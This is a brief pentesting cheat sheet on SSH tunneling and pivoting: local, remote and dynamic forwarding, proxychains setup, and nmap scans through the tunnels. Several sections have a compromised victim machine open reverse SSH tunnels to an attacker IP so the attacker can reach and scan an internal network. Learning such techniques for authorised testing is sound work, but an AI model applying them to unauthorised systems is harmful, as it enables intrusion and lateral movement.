Use ssh local static port forwarding to get access to a remote target's <victimPort> on the specified <attackerPort> by ssh'ing from our attacker machine to the victim machine:
	syntax : ssh <user>@<victimIP> -L <interface>:<attackerPort>:<interface>:<victimPort>
	example: ssh dave@10.10.13.109 -L 127.0.0.1:8002:192.168.45.67:80   # forward port 8002 of a machine in the internal network that the victim machine can reach
	example: ssh dave@10.10.13.109 -N -L 127.0.0.1:8002:127.0.0.1:8080	# ssh-tunneling without getting an actual shell on the host (background with &)

Use ssh remote static port forwarding to get access to a remote target's <victimPort> on the specified <attackerPort> by ssh'ing from the victim machine to our attacker machine:
	syntax : ssh <user>@<attackerIP> -R <interface>:<victimPort>:<interface>:<attackerPort>
	example: ssh dave@192.168.0.123 -R 127.0.0.1:3306:127.0.0.1:3307 

Use dynamic ssh tunneling to forward all incoming traffic through the remote machine(socks proxy):
	Step 1(attacker): 
        syntax : ssh -D <attacker_socks_port> <user>@<targetIP>	
        example: ssh -D 1080 admin@10.27.39.56
	Step 2(attacker): vi /etc/proxychains.conf 	    # add "socks4 127.0.0.1 1080" or "socks5 127.0.0.1 1080"
	Step 3(attacker): execute commands on the attacking machine and forward it to the remote machine
		
		# Example with nmap
		syntax : proxychains nmap -p <port> -sT -Pn -n <targetIpRange>
		example: proxychains nmap -p 22 -sT -Pn -n 10.13.13.1-15
		example: proxychains ssh admin@10.13.13.4

Use a compromised machine to set up a reverse SOCKS proxy on the remote machine into the victim's network (if we can't do an invound ssh to the victim):
    Step 1(victim)  : 
        syntax : ssh -R <interface>:<attacker_socks_port> <user>@<attackerIP>
        example: ssh -R 0.0.0.0:1080 kali@220.34.54.91
    Step 2(attacker):
        example: proxychains -q nmap -Pn -sT -n -p 80,443 <targetIP>

Use a compromised machine to tunnel to us so we can attack another network via our attacking machine (if we can't do an initial inbound ssh):
	Step 1(attacker): service ssh start
	Step 2(victim)	: 
        syntax : ssh -f -N -R <interface>:<attackerPort>:<interface>:22 <attacker>@<attackerIP>	
        example: ssh -f -N -R 127.0.0.1:2222:127.0.0.1:22 hacker@192.168.0.128
	Step 3(attacker): 
        syntax : ssh -f -N -D <interface>:<attackerPort> -p 2222 <victim>@127.0.0.1	
        example: ssh -f -N -D 127.0.0.1:8080 -p 2222 sysadmin@127.0.0.1
	Step 4(attacker): vi /etc/proxychains.conf -> add "socks4 127.0.0.1 8080" to the list for this example
	
	Example Step 5(attacker): proxychains nmap -sT -Pn -n 10.15.23.12
